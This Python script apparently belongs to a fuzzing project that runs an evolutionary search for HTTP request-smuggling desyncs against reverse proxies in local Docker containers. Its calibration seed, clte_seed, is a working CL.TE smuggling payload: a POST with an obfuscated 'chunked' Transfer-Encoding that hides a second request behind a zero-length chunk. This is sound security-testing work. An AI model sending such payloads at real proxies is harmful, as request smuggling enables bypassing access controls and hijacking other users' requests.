#!/usr/bin/env python3
# Phage: run the evolutionary search against a matrix front.
# License: Apache-2.0 License

"""Point the evolutionary search at the front half of the matrix population.

The search has only ever been run against the HTTP/3 lab, one edge and one backend.
The matrix knows about seven reverse proxies and has never had the fuzzer aimed at any
of them. This closes that: one front from `matrix/fronts.py` runs as a container with
the counting echo backend behind it, and `make_proxy_run_case` supplies the verdict
(the backend framed a request the proxy never acknowledged).

Calibration runs first and is not optional. The known-positive is a `Content-Length`
plus an obfuscated `Transfer-Encoding` hiding a request behind a zero-length chunk,
which is the sozu regression this project reported. If the oracle cannot see that here,
the run aborts rather than producing a clean sweep nobody should believe.

Usage: python matrix/evo_vs_front.py --front sozu --generations 40
"""

import argparse
import json
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

import run_fronts  # noqa: E402
from fronts import FRONTS, UPSTREAM_PORT  # noqa: E402
from phage.evo import genome as G  # noqa: E402
from phage.evo.echo_backend import EchoBackend  # noqa: E402
from phage.evo.gates import CalibrationError  # noqa: E402
from phage.evo.proxy import make_proxy_run_case  # noqa: E402
from phage.evo.runner import search  # noqa: E402

SMUGGLED = b"GET /SMUGGLED HTTP/1.1\r\nHost: lab\r\n\r\n"


def clte_seed(te: bytes = b"chunked\t") -> list:
    """The known-positive: a carrier whose Content-Length covers a hidden request and
    whose Transfer-Encoding is spelled so a lenient front forwards it unchanged. A front
    that frames by CL and a backend that honors the TE then disagree by one request."""
    body = b"0\r\n\r\n" + SMUGGLED
    return [
        G.Headers(
            (
                (b":method", b"POST"),
                (b":scheme", b"http"),
                (b":authority", b"lab"),
                (b":path", b"/carrier"),
                (b"content-length", str(len(body)).encode()),
                (b"transfer-encoding", te),
            ),
            end_stream=False,
        ),
        G.Data(body, end_stream=True),
    ]


def main() -> int:
    ap = argparse.ArgumentParser(
        description="evolutionary search against a matrix front"
    )
    ap.add_argument("--front", default="sozu")
    ap.add_argument("--generations", type=int, default=40)
    ap.add_argument("--seed", type=int, default=11)
    ap.add_argument("--out", default="matrix/EVO_FRONT.json")
    args = ap.parse_args()

    spec = next(f for f in FRONTS if args.front.lower() in f["name"].lower())
    log = Path(tempfile.mkdtemp(prefix="phage_evo_")) / "backend.jsonl"
    backend = EchoBackend("127.0.0.1", UPSTREAM_PORT, str(log)).start()

    result = {"target": spec["id"], "front": spec["name"], "calibrated": False}
    cfgdir = None
    try:
        ok, cfgdir = run_fronts.start(spec)
        if not ok:
            print(f"{spec['name']} did not start")
            return 1
        run_case = make_proxy_run_case("127.0.0.1", spec["port"], str(log))
        import random

        try:
            _archive, hits, minimized = search(
                run_case,
                random.Random(args.seed),
                generations=args.generations,
                calibration=(clte_seed(), G.seed_post()),
                stabilize=2,
            )
            result["calibrated"] = True
        except CalibrationError as exc:
            result["verdict"] = f"calibration aborted: {exc}"
            print(result["verdict"])
            return 1
        result["hits"] = len(hits)
        result["verdict"] = "desync" if hits else "clean"
        result["smallest_ops"] = min((len(m) for m in minimized), default=0)
    finally:
        backend.shutdown()
        backend.server_close()
        run_fronts.docker("rm", "-f", run_fronts.CONTAINER)
        if cfgdir:
            import shutil

            shutil.rmtree(cfgdir, ignore_errors=True)

    Path(args.out).write_text(json.dumps(result, indent=2) + "\n")
    print(
        f"{spec['name']}: calibrated={result['calibrated']} "
        f"verdict={result['verdict']} hits={result.get('hits')}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
